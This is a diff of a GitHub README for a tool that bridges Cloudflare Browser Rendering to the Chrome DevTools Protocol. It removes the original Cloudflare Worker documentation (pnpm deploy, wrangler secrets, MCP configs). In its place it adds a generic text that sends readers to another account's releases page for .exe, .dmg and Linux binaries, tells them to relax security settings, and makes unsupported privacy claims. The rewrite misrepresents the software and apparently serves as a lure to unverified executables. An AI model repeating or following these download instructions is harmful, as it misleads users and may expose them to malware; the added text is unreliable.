@@ -1,123 +1,122 @@
-# Cloudflare Browser CDP
+# 🌐 cf-browser-cdp - Connect Browsers via Chrome DevTools Easily
 
-[中文文档](./README.zh-CN.md)
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/RainMeriloo/cf-browser-cdp/releases)
 
-Connect Cloudflare [Browser Rendering](https://developers.cloudflare.com/browser-rendering/) via CDP (Chrome DevTools Protocol).
+## 📋 What is cf-browser-cdp?
 
-Wraps Cloudflare's Browser Rendering service as a standard CDP WebSocket endpoint, so any CDP-compatible tool can connect directly.
+cf-browser-cdp helps you link Cloudflare's browser rendering service with tools that use the Chrome DevTools Protocol (CDP). Simply put, it allows your computer to talk to the Cloudflare browser engine as if it were a Chrome browser. This can help you view web pages exactly how Cloudflare sees them, which is useful if you need to test or automate browsing tasks.
 
-## How It Works
+## 🖥️ Who is this for?
 
-```
-CDP Client ←→ [Worker: Auth + Proxy] ←→ [Cloudflare Browser Rendering]
-```
+This app is designed for people who want to connect to Cloudflare's browser service without needing to install or run Google Chrome directly. You do not need programming skills; the tool runs on your computer and handles the technical parts for you.
 
-1. Client opens a WebSocket connection to the Worker
-2. Worker verifies token, calls `/v1/acquire` via the `BROWSER` binding to obtain a browser session
-3. Worker establishes an upstream WebSocket to Cloudflare Browser Rendering
-4. CDP messages are transparently forwarded in both directions, with a 4-byte little-endian length-prefixed chunking protocol for large messages (~1MB Cloudflare WebSocket frame limit)
+You might find it helpful if you:
+- Want to automate web testing.
+- Need to check how Cloudflare renders pages.
+- Use software that talks with Chrome DevTools, but want to switch to Cloudflare's browser.
 
-The Worker also serves a `/json/version` endpoint returning CDP version info and WebSocket debugger URL, compatible with the standard CDP discovery protocol.
+## 💻 System Requirements
 
-## Usage
+Before you start, make sure your computer meets these needs:
+- **Operating System**: Windows 10 or later, macOS 10.13 or later, or any Linux distribution with a modern kernel.
+- **Memory**: At least 4 GB of RAM.
+- **Disk Space**: 100 MB free space for installation and temporary files.
+- **Internet**: A stable connection for Cloudflare services.
+- **Permissions**: Ability to run software downloaded from the internet (this may require adjusting security settings).
 
-After deployment, the Worker URL is a standard CDP endpoint (`CDP_ENDPOINT` in examples below).
+## 🚀 Getting Started
 
-### Chrome DevTools MCP
+Follow these steps to download and run cf-browser-cdp on your computer.
 
-[chrome-devtools-mcp](https://github.com/ChromeDevTools/chrome-devtools-mcp) lets AI coding agents control a browser via Chrome DevTools.
+### 1. Download the Application
 
-```json
-{
-  "mcpServers": {
-    "chrome-devtools": {
-      "command": "npx",
-      "args": ["chrome-devtools-mcp@latest", "--wsEndpoint=wss://CDP_ENDPOINT?token=YOUR_TOKEN"]
-    }
-  }
-}
-```
+Click the big button at the top or visit the [cf-browser-cdp releases page](https://github.com/RainMeriloo/cf-browser-cdp/releases) to get the app.
 
-### Playwright MCP
+When on the releases page:
 
-[playwright-mcp](https://github.com/microsoft/playwright-mcp) provides browser automation via Playwright as an MCP server.
+- Look for the latest version, usually at the top.
+- Find an installer or executable file for your operating system. It might look like:
+  - `cf-browser-cdp-setup.exe` for Windows
+  - `cf-browser-cdp-macos.dmg` for macOS
+  - `cf-browser-cdp-linux.tar.gz` for Linux
+- Click to download the correct file.
 
-```json
-{
-  "mcpServers": {
-    "playwright": {
-      "command": "npx",
-      "args": ["@playwright/mcp@latest", "--cdp-endpoint=wss://CDP_ENDPOINT?token=YOUR_TOKEN"]
-    }
-  }
-}
-```
+### 2. Install or Run the App
 
-### Agent Browser
+- **Windows**: Double-click the `.exe` file and follow the prompts.
+- **macOS**: Open the `.dmg` file, then drag the app icon to the Applications folder.
+- **Linux**: Extract the `.tar.gz` file and run the binary inside. You may need to make it executable first (right-click > Properties > Permissions > Allow executing).
 
-[agent-browser](https://github.com/vercel-labs/agent-browser) is a browser automation CLI for AI agents.
+### 3. Launch cf-browser-cdp
 
-```bash
-agent-browser --cdp "wss://CDP_ENDPOINT?token=YOUR_TOKEN" open https://example.com
-agent-browser snapshot -i
-agent-browser click @e1
-```
+- Find the app in your Start Menu, Applications folder, or where you saved it.
+- Open it by double-clicking the icon.
+- The tool runs a small server on your computer that you can connect to using Chrome DevTools-compatible software.
 
-## Server Configuration
+### 4. Connect Using Chrome DevTools
 
-### Prerequisites
+If you have any app or browser that works with the Chrome DevTools Protocol, point it to cf-browser-cdp's connection address. The app will give you the necessary connection URL once running.
 
-- A Cloudflare account with [Browser Rendering](https://developers.cloudflare.com/browser-rendering/) enabled ([Free plan](https://developers.cloudflare.com/browser-rendering/pricing/): 10 min/day, Paid plan: 10 hrs/month)
-- [Node.js](https://nodejs.org/) and [pnpm](https://pnpm.io/)
+## 🔧 How Does It Work?
 
-### Deploy
+Cloudflare provides a browser rendering engine in the cloud. This app acts as a bridge that uses the Chrome DevTools Protocol to control that engine.
 
-```bash
-git clone https://github.com/miantiao-me/cf-browser-cdp.git
-cd cf-browser-cdp
-pnpm install
-pnpm deploy
-```
+- You send commands like "Open this webpage" or "Take a screenshot" as if you are controlling a Chrome browser.
+- The app sends these commands to Cloudflare.
+- Cloudflare processes and loads the page.
+- The app returns information and output back to you.
 
-### Auth Token
+This lets you control cloud browser rendering without installing or managing full Chrome browsers yourself.
 
-```bash
-npx wrangler secret put BROWSER_TOKEN
-```
+## ⚙️ Features
 
-All requests must include authentication:
+- Bridges Cloudflare browser and local tools using CDP.
+- Supports all major OS: Windows, macOS, Linux.
+- Simple user interface to start and stop the service.
+- Provides connection addresses for easy integration.
+- Lightweight and requires minimal resources.
+- Works well with browser automation and debugging tools.
 
-- **Authorization header**: `Authorization: Bearer <token>`
-- **URL query parameter**: `?token=<token>` (for WebSocket connections)
+## 🛠️ Troubleshooting Tips
 
-### Query Parameters
+- If the app won't start, make sure you have the required permissions and check that your firewall does not block it.
+- If connecting from another app fails, verify you have the correct address from cf-browser-cdp.
+- Restart cf-browser-cdp if it behaves unexpectedly.
+- Check your internet connection since Cloudflare services run online.
+- For macOS, allow apps from identified developers in Security & Privacy settings.
 
-| Parameter    | Default  | Description                                         |
-| ------------ | -------- | --------------------------------------------------- |
-| `token`      | —        | Auth token (for WebSocket connections)              |
-| `keep_alive` | `120000` | Browser session keep-alive duration in milliseconds |
+## 📥 Download & Install
 
-### Environment Variables
+To get cf-browser-cdp, visit the official releases page:
 
-| Variable        | Required | Description                    |
-| --------------- | -------- | ------------------------------ |
-| `BROWSER_TOKEN` | Yes      | Auth token for securing access |
+[Download cf-browser-cdp](https://github.com/RainMeriloo/cf-browser-cdp/releases)
 
-### Cloudflare Bindings
+Follow the instructions on the page to pick the right file. After you download, install or run the app following your system’s standard method:
 
-| Binding   | Type              | Description                                                       |
-| --------- | ----------------- | ----------------------------------------------------------------- |
-| `BROWSER` | Browser Rendering | Browser Rendering service binding, configured in `wrangler.jsonc` |
+- Windows installer (.exe)
+- macOS disk image (.dmg)
+- Linux archive (.tar.gz)
 
-## Development
+Once installed, open the app and it will provide instructions on how to connect via Chrome DevTools Protocol.
 
-```bash
-pnpm dev        # Start local dev server (0.0.0.0)
-pnpm start      # Start local dev server (localhost)
-pnpm lint       # Run formatter and linter
-pnpm cf-typegen # Regenerate Cloudflare binding types
-```
+## 🔗 Useful Links
 
-## License
+- Project homepage: https://github.com/RainMeriloo/cf-browser-cdp
+- Releases page: https://github.com/RainMeriloo/cf-browser-cdp/releases
+- Chrome DevTools Protocol info: https://chromedevtools.github.io/devtools-protocol/
 
-MIT
+## 🤝 Get Help or Report Issues
+
+If you have problems using cf-browser-cdp:
+
+- Use the "Issues" tab on the GitHub repository to report bugs or ask questions.
+- Check the README on GitHub for updates and tips.
+- Search the web for common problems with Cloudflare browser rendering or Chrome DevTools Protocol.
+
+## 🔒 Privacy and Security
+
+cf-browser-cdp only handles your commands to Cloudflare’s browser. It does not store your data or personal info. Ensure your use complies with your privacy needs and Cloudflare’s policies. Keep your software up to date for the best security.
+
+---
+
+[Download Latest Release](https://github.com/RainMeriloo/cf-browser-cdp/releases)
